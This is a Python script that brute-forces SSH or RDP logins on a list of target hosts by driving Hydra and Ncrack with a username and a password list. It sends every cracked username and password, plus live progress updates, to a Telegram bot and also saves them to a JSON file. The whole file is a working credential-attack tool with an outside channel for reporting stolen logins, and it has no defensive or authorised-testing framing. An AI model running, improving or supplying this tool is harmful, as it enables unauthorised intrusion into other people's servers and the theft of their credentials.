#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
from datetime import datetime
import requests
import json
from concurrent.futures import ThreadPoolExecutor

# Configuration
CONFIG = {
    'telegram': {
        'bot_token': 'YOUR_TELEGRAM_BOT_TOKEN',
        'chat_id': 'YOUR_TELEGRAM_CHAT_ID',
    },
    'brute_force': {
        'max_threads': 4,  # Reduced for testing
        'timeout_per_host': 60,  # Increased timeout
    },
    'tools': {
        'hydra': '/usr/bin/hydra',
        'ncrack': '/usr/bin/ncrack',
    }
}

# Global counters
STATUS = {
    'total': 0,
    'tried': 0,
    'good': 0,
    'bad': 0,
    'na': 0,
    'start_time': time.time(),
    'running': True
}

# Results storage
RESULTS = {
    'success': [],
    'failures': []
}

def send_telegram_message(message):
    """Send message to Telegram bot"""
    if CONFIG['telegram']['bot_token'] == 'YOUR_TELEGRAM_BOT_TOKEN':
        print(f"Telegram message (not sent): {message[:100]}...")
        return None
    
    url = f"https://api.telegram.org/bot{CONFIG['telegram']['bot_token']}/sendMessage"
    payload = {
        'chat_id': CONFIG['telegram']['chat_id'],
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Telegram error: {e}")
        return None

def analyze_hydra_output(output, service, target):
    """Parse Hydra output for results"""
    print(f"Analyzing output for {target}:\n{output[:500]}...")  # Debug output
    
    lines = output.split('\n')
    for line in lines:
        # Look for successful login patterns
        if ('login:' in line and 'password:' in line) or ('[ssh]' in line and 'host:' in line):
            parts = line.split()
            try:
                # Try different patterns for extracting credentials
                if 'login:' in line and 'password:' in line:
                    username = parts[parts.index('login:') + 1]
                    password = parts[parts.index('password:') + 1]
                else:
                    # Alternative pattern for SSH
                    username = parts[parts.index('[ssh]') + 3]  # Adjust based on actual output
                    password = parts[parts.index('[ssh]') + 5]
                
                result = {
                    'service': service,
                    'target': target,
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().isoformat()
                }
                
                RESULTS['success'].append(result)
                STATUS['good'] += 1
                
                # Send immediate Telegram alert for successful login
                message = (
                    f"🚨 <b>SUCCESSFUL LOGIN FOUND!</b> 🚨\n\n"
                    f"<b>Service:</b> {service}\n"
                    f"<b>Target:</b> {target}\n"
                    f"<b>Username:</b> {username}\n"
                    f"<b>Password:</b> {password}\n"
                    f"<b>Time:</b> {result['timestamp']}"
                )
                send_telegram_message(message)
                print(f"SUCCESS: Found credentials for {target}: {username}:{password}")
                
            except (ValueError, IndexError) as e:
                print(f"Error parsing line: {line} - {e}")
                continue

def brute_force_service(service, target, username, password_list):
    """Brute force a service with given credentials"""
    output_file = f"/tmp/bruteforce_{service}_{target.replace('.', '_')}.txt"
    
    print(f"Starting brute force on {target} with user {username}")
    
    if service.lower() == 'ssh':
        # Test with a simpler command first
        cmd = [
            CONFIG['tools']['hydra'],
            '-l', username,
            '-P', password_list,
            '-t', '2',  # Reduced threads for testing
            '-v',  # Verbose output
            '-f',   # Stop after first found
            '-o', output_file,
            'ssh://' + target
        ]
    elif service.lower() == 'rdp':
        cmd = [
            CONFIG['tools']['ncrack'],
            '-vv',
            '--user', username,
            '--passwords', password_list,
            f'rdp://{target}',
            '-oN', output_file
        ]
    else:
        print(f"Unsupported service: {service}")
        return
    
    try:
        print(f"Executing: {' '.join(cmd)}")
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=CONFIG['brute_force']['timeout_per_host'])
        
        print(f"STDOUT: {stdout[:200]}...")
        print(f"STDERR: {stderr[:200]}...")
        print(f"Return code: {process.returncode}")
        
        # Check if output file exists and has content
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file, 'r') as f:
                output = f.read()
            analyze_hydra_output(output, service, target)
        else:
            print(f"No output file found or empty: {output_file}")
            STATUS['bad'] += 1
            
    except subprocess.TimeoutExpired:
        process.kill()
        STATUS['na'] += 1
        print(f"Timeout reached for {target}")
    except Exception as e:
        STATUS['na'] += 1
        print(f"Error brute forcing {target}: {e}")
        import traceback
        traceback.print_exc()
    finally:
        STATUS['tried'] += 1
        try:
            if os.path.exists(output_file):
                os.remove(output_file)
        except:
            pass

def status_monitor():
    """Monitor and report status periodically"""
    while STATUS['running']:
        elapsed = time.time() - STATUS['start_time']
        tried = max(1, STATUS['tried'])
        remaining = (elapsed / tried) * max(0, (STATUS['total'] - STATUS['tried']))
        
        status_msg = (
            f"<b>Brute Force Status Update</b>\n\n"
            f"🟢 <b>Good:</b> {STATUS['good']}\n"
            f"🔴 <b>Bad:</b> {STATUS['bad']}\n"
            f"⚪ <b>N/A:</b> {STATUS['na']}\n"
            f"🔄 <b>Tried:</b> {STATUS['tried']}/{STATUS['total']}\n"
            f"⏱️ <b>Elapsed:</b> {time.strftime('%H:%M:%S', time.gmtime(elapsed))}\n"
            f"⏳ <b>Remaining:</b> {time.strftime('%H:%M:%S', time.gmtime(remaining))}\n"
            f"📊 <b>Completion:</b> {STATUS['tried']/STATUS['total']*100:.2f}%"
        )
        
        send_telegram_message(status_msg)
        time.sleep(60)  # Send update every 1 minute for testing

def main():
    if len(sys.argv) < 5:
        print("Usage: ./bruteforcer.py <service> <targets_file> <username> <password_list>")
        print("Example: ./bruteforcer.py ssh targets.txt fino passwords.txt")
        sys.exit(1)
    
    service = sys.argv[1]
    targets_file = sys.argv[2]
    username = sys.argv[3]
    password_list = sys.argv[4]
    
    # Validate files exist
    if not os.path.isfile(targets_file):
        print(f"Targets file not found: {targets_file}")
        sys.exit(1)
    
    if not os.path.isfile(password_list):
        print(f"Password list file not found: {password_list}")
        sys.exit(1)
    
    # Validate tools
    if not os.path.isfile(CONFIG['tools']['hydra']):
        print(f"Hydra not found at {CONFIG['tools']['hydra']}")
        # Try to find hydra
        hydra_path = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
        if hydra_path.returncode == 0:
            CONFIG['tools']['hydra'] = hydra_path.stdout.strip()
            print(f"Found hydra at: {CONFIG['tools']['hydra']}")
        else:
            sys.exit(1)
    
    # Read targets
    with open(targets_file, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    STATUS['total'] = len(targets)
    
    print(f"Starting brute force with:")
    print(f"Service: {service}")
    print(f"Targets: {len(targets)}")
    print(f"Username: {username}")
    print(f"Password list: {password_list}")
    
    # Start status monitor thread
    monitor_thread = threading.Thread(target=status_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Initial Telegram notification
    start_msg = (
        f"🔥 <b>Brute Force Attack Started</b> 🔥\n\n"
        f"<b>Service:</b> {service}\n"
        f"<b>Targets:</b> {len(targets)}\n"
        f"<b>Username:</b> {username}\n"
        f"<b>Password list:</b> {password_list}\n"
        f"<b>Start time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    send_telegram_message(start_msg)
    
    # Start brute forcing
    with ThreadPoolExecutor(max_workers=CONFIG['brute_force']['max_threads']) as executor:
        for target in targets:
            executor.submit(brute_force_service, service, target, username, password_list)
    
    # Final report
    STATUS['running'] = False
    time.sleep(2)  # Give monitor thread time to finish
    
    elapsed = time.time() - STATUS['start_time']
    final_msg = (
        f"🏁 <b>Brute Force Attack Completed</b> 🏁\n\n"
        f"<b>Total targets:</b> {STATUS['total']}\n"
        f"<b>Successful logins:</b> {STATUS['good']}\n"
        f"<b>Failed attempts:</b> {STATUS['bad']}\n"
        f"<b>N/A:</b> {STATUS['na']}\n"
        f"<b>Total time:</b> {time.strftime('%H:%M:%S', time.gmtime(elapsed))}\n"
        f"\n<b>Successful logins:</b>\n"
    )
    
    for result in RESULTS['success']:
        final_msg += (
            f"\n🔓 <b>{result['service'].upper()} access</b>\n"
            f"<b>Target:</b> {result['target']}\n"
            f"<b>Username:</b> {result['username']}\n"
            f"<b>Password:</b> {result['password']}\n"
        )
    
    if not RESULTS['success']:
        final_msg += "\nNo successful logins found 😞"
    
    send_telegram_message(final_msg)
    
    # Save results to file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_file = f"bruteforce_results_{timestamp}.json"
    with open(results_file, 'w') as f:
        json.dump(RESULTS, f, indent=2)
    
    print(f"Brute force completed. Results saved to {results_file}")

if __name__ == "__main__":
    main()
